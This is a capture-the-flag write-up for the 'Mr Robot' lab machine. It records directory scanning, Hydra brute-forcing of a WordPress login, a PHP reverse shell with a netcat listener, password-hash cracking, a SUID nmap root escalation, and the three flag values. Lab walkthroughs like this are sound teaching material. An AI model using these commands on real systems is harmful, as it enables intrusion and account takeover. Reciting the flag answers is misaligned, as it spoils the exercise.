#Mr Robot CTF

IP ADDRESS: `10.10.27.214`


#NMAP
80
443

#WEBSERVER
* visited `10.10.27.214/robots.txt`
* found `key-1-of-3.txt` and `fsocity.dic`


#GOBUSTER
/images               (Status: 301) [Size: 235] [--> http://10.10.27.214/images/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.27.214/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.27.214/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.27.214/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.27.214/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.27.214/feed/]
/video                (Status: 301) [Size: 234] [--> http://10.10.27.214/video/]
/image                (Status: 301) [Size: 0] [--> http://10.10.27.214/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.27.214/feed/atom/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.27.214/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.27.214/admin/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.27.214/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2606]
/css                  (Status: 301) [Size: 232] [--> http://10.10.27.214/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.27.214/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.27.214/wp-includes/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.27.214/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.27.214/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.27.214/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.27.214/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]

* found wordpress is running
* could not enumerate usernames with wordpress scan

#HYDRA
* used hydra to enumerate usernames
`hydra -L fsocity.dic -p test 10.10.27.214 http-post-form "/wp-login.php:log^USER^&pwd=^PWD^:Invalid username" -t 30`
* found username `Elliot`
* Brute forced password
`hydra -l Elliot -P pass.txt 10.10.27.214 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"`
* found password `ER28-0652`

#REVERSE SHELL
* uploaded a reverse php shell in wordpress dashboard > Appearance > Editor > archive.php
* opened a nc listner `nc -lvnp 53`
* visited `10.10.27.214/wp-content/themes/twentyfifteen/archive.php`

#SHELL
* found password hash of `robot` user and `key-2-of-3.txt` in `daemon` user home directory
* used john to crack password and found password `abcdefghijklmnopqrstuvwxyz`
* upgraded the shell using `python -c "import pty;pty.spawn('/bin/bash')"`
* `su robot` and entered the password
* read the `key-2-of-3.txt`
* `find / -perm +6000 2>/dev/null | grep '/bin/`
* found `usr/local/bin/nmap`
* `/usr/local/bin/nmap --interactive`
* `!sh`
* escalated privilege to root user
* `cd /root`
* found `key-3-of-3.txt`



#KEYS
1. `073403c8a58a1f80d943455fb30724b9`
2. `822c73956184f694993bede3eb39f959`
3. `04787ddef27c3dee1ee161b21670b4e4`